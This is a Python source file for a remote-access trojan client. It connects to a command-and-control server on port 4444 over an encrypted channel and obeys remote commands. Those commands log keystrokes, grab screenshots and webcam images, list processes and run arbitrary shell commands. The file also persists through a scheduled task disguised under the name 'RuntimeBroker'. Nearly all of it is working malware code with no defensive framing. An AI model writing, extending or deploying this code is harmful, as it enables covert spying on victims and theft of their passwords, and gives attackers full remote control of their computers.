import os, sys, socket, time, json, base64, io, threading, subprocess, ctypes
from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
from cryptography.hazmat.primitives import serialization
from crypto_layer import derive_key, send_frame, recv_frame, recv_exact

HOST = "192.168.122.1"
PORT = 4444
RECONNECT_DELAY = 10

try:
    import mss
    from PIL import Image
    import cv2
    import psutil
    from pynput import keyboard
except Exception:
    pass

_keylog_buffer = []
_keylog_running = False
_keylog_lock = threading.Lock()

def _keylog_listener():
    global _keylog_running
    def on_press(key):
        if not _keylog_running:
            return False
        try:
            ch = key.char
        except AttributeError:
            ch = f"[{key.name}]"
        with _keylog_lock:
            _keylog_buffer.append(ch)
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def cmd_screenshot():
    with mss.mss() as sct:
        img = sct.grab(sct.monitors[1])
        im = Image.frombytes("RGB", img.size, img.rgb)
        buf = io.BytesIO()
        im.save(buf, format="JPEG", quality=70)
        return base64.b64encode(buf.getvalue()).decode()

def cmd_webcam():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()
    if not ret:
        return ""
    ok, buf = cv2.imencode(".jpg", frame)
    return base64.b64encode(buf.tobytes()).decode() if ok else ""

def cmd_proclist():
    return "\n".join(f"{p.pid}\t{p.name()}" for p in psutil.process_iter(["pid", "name"]))

def cmd_keylog_start():
    global _keylog_running
    if _keylog_running:
        return "already running"
    _keylog_running = True
    threading.Thread(target=_keylog_listener, daemon=True).start()
    return "started"

def cmd_keylog_dump():
    with _keylog_lock:
        data = "".join(_keylog_buffer)
    return data

def cmd_keylog_stop():
    global _keylog_running
    _keylog_running = False
    return "stopped"

def cmd_keylog_clear():
    with _keylog_lock:
        _keylog_buffer.clear()
    return "cleared"

def cmd_shell(args):
    try:
        out = subprocess.check_output(args, shell=True, stderr=subprocess.STDOUT, timeout=30)
        return out.decode(errors="replace")
    except Exception as e:
        return f"error: {e}"

def cmd_persist():
    try:
        exe = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(sys.argv[0])
        subprocess.run(
            ["schtasks", "/Create", "/F", "/SC", "ONLOGON", "/TN", "RuntimeBroker",
             "/TR", f'"{exe}"'],
            check=True, capture_output=True
        )
        return "persisted"
    except Exception as e:
        return f"error: {e}"

def cmd_stream_start():
    return "stream not implemented in P0"

def cmd_stream_stop():
    return "stream not implemented in P0"

def dispatch(cmd: str) -> str:
    if cmd == "screenshot":
        return cmd_screenshot()
    if cmd == "webcam":
        return cmd_webcam()
    if cmd == "proclist":
        return cmd_proclist()
    if cmd == "keylog_start":
        return cmd_keylog_start()
    if cmd == "keylog_dump":
        return cmd_keylog_dump()
    if cmd == "keylog_stop":
        return cmd_keylog_stop()
    if cmd == "keylog_clear":
        return cmd_keylog_clear()
    if cmd == "persist":
        return cmd_persist()
    if cmd == "stream_start":
        return cmd_stream_start()
    if cmd == "stream_stop":
        return cmd_stream_stop()
    if cmd.startswith("sh:"):
        return cmd_shell(cmd[3:])
    return "unknown command"

def connect_c2():
    s = socket.create_connection((HOST, PORT), timeout=30)
    priv = X25519PrivateKey.generate()
    pub_bytes = priv.public_key().public_bytes(
        serialization.Encoding.Raw, serialization.PublicFormat.Raw
    )
    s.sendall(pub_bytes)
    peer_pub = recv_exact(s, 32)
    shared = priv.exchange(X25519PublicKey.from_public_bytes(peer_pub))
    key = derive_key(shared)
    return s, key

def main_loop():
    while True:
        try:
            s, key = connect_c2()
            send_frame(s, key, json.dumps({"type": "hello", "host": socket.gethostname()}).encode())
            while True:
                raw = recv_frame(s, key)
                msg = json.loads(raw.decode())
                cmd = msg.get("cmd", "")
                result = dispatch(cmd)
                send_frame(s, key, json.dumps({"type": "result", "cmd": cmd, "data": result}).encode())
        except Exception:
            time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    main_loop()
